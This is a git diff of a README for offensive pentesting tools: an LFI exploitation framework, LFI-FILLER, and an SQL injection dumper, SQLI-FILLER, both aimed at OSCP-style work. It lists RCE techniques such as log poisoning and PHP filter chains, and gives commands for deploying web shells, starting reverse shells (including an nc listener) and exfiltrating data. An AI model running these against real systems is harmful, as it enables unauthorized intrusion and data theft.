@@ -1,71 +1,74 @@
-# LFI-FILLER v3.1: LFI Exploitation Framework
+# SD-DEVSECOPS: Advanced Pentesting Checkers Suite
 
+A collection of high-performance, automated security tools designed for rapid enumeration, vulnerability discovery, and exploitation. Built by security professionals for the **OSCP** and beyond.
 
-**LFI-FILLER (LFILLER)** is a high-performance, multi-threaded LFI (Local File Inclusion) scanner and exploitation framework designed for security professionals and penetration testers. It automates the process of finding vulnerable parameters, bypassing WAFs, and achieving Remote Code Execution (RCE) via multiple advanced vectors.
+---
 
-## 🚀 Key Features
+## 🛠️ Included Tools
 
-- **High-Speed Concurrency**: Powered by `ThreadPoolExecutor` for fast multi-parameter scanning.
-- **Advanced WAF Bypasses**: Intelligent encoding (URL, Double URL, Unicode, etc.) and OS-specific path normalization.
-- **Intelligent Detection**: Uses content-reflection, content-length analysis, and regex patterns to identify valid inclusions accurately.
-- **Comprehensive Exploitation Engine**:
-    - **Log Poisoning**: Automated RCE via Apache/Nginx logs and User-Agent/Referer injection.
-    - **SSH Poisoning**: Injects PHP payloads into SSH authentication logs (`/var/log/auth.log`).
-    - **PHP Filter Chaining**: Modern "No Logs" RCE technique using complex `php://filter` chains.
-    - **PEARCMD Exploit**: Leverages PEAR manager for direct shell creation.
-    - **RFI (Remote File Inclusion)**: Automated inclusion of remote payloads.
-- **Automated Shell Deployment**: Creates persistence with mini web shells or triggers interactive reverse shells (Bash, Python, NC, PHP).
+### 1. LFI-FILLER (v3.1)
+The ultimate framework for Local File Inclusion discovery and exploitation.
+- **Key Features**: Multi-threaded, WAF Bypasses, PHP Filter Chaining, Log/SSH Poisoning, Automated Shells.
+- **Main Script**: `lfiller.py`
+- **[Quick Usage Guide Pin](#-lfi-filler-v31-quick-usage)**
 
-## 🛠️ Installation
+### 2. SQLI-FILLER (v1.0 - OSCP Edition)
+High-speed SQL injection scanner and automated exfiltration tool.
+- **Key Features**: Error/Time/Boolean-blind detection, UNION column discovery, Auto-Data Dump, WAF Tamper scripts.
+- **Main Script**: `sqlifiller.py`
+- **[Quick Usage Guide Pin](#-sqli-filler-v10-quick-usage)**
 
-```bash
-git clone https://github.com/SD-DEVSECOPS/LFI_CHECKERS.git
-cd LFI_CHECKERS
-pip install requests tqdm  # (tqdm is optional for progress tracking if added)
-```
+---
 
-## 📖 Usage Examples
+## 🚀 LFI-FILLER v3.1 Quick Usage
 
-### 1. Basic Scan
-Scan a target URL for LFI vulnerabilities:
-```bash
-python3 lfiller.py -u "http://target.com/view.php?file=test"
-```
-
-### 2. Full Exploitation & Web Shell
-Scan and attempt to deploy a PHP web shell to the server:
+Scan and attempt to deploy a PHP web shell:
 ```bash
 python3 lfiller.py -u "http://target.com/view.php" -webshell
 ```
 
-### 3. Reverse Shell (Requires Listener)
-Start a listener (`nc -lvnp 4444`) and run:
+Reverse shell via LHost:
 ```bash
 python3 lfiller.py -u "http://target.com/view.php" -lh YOUR_IP -lp 4444
 ```
 
-### 4. Bypassing WAFs
-Try all encoding techniques to evade simple filters:
+---
+
+## 🚀 SQLI-FILLER v1.0 Quick Usage
+
+Fast scan and automated data exfiltration:
 ```bash
-python3 lfiller.py -u "http://target.com/view.php" -e all
+python3 sqlifiller.py -u "http://target.com/products.php?id=1"
 ```
 
-## 🧪 Advanced Techniques Explained
+POST-based injection test:
+```bash
+python3 sqlifiller.py -u "http://target.com/login.php" -m POST -d "user=admin&pass=123"
+```
 
-| Technique | Goal | Requirement |
-|-----------|------|-------------|
-| **Log Poisoning** | RCE | Readable web logs (Apache/Nginx) |
-| **SSH Poisoning** | RCE | SSH access + Readable `auth.log` |
-| **PHP Filter Chain** | RCE | LFI on PHP >= 7.0 (No logs needed!) |
-| **PEARCMD** | RCE | PEAR manager installed on server |
-| **Input Wrappers** | RCE | `allow_url_include = On` or `php://input` access |
+---
+
+## 🧪 Advanced Features Comparison
+
+| Feature | LFI-FILLER | SQLI-FILLER |
+|---------|------------|-------------|
+| **Multi-threading** | ✅ | ✅ |
+| **WAF Bypass** | ✅ (Encoding) | ✅ (Tamper) |
+| **RCE Vectors** | 10+ | ✅ (Outfile/CMDShell) |
+| **Auto-Exploitation** | ✅ | ✅ |
+| **OSCP Ready** | ✅ | ✅ |
+
+## 📦 Installation
+
+```bash
+git clone https://github.com/SD-DEVSECOPS/CHECKERS.git
+cd CHECKERS
+pip install requests
+```
 
 ## ⚠️ Disclaimer
 
-This tool is for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have permission to test is illegal. The author is not responsible for any misuse or damage caused by this utility.
-
-## 🤝 Contributing
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/SD-DEVSECOPS/LFI_CHECKERS/issues).
+This suite is for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have permission to test is illegal. The author is not responsible for any misuse or damage caused by these utilities.
 
 ---
 **Maintained by SD-DEVSECOPS**
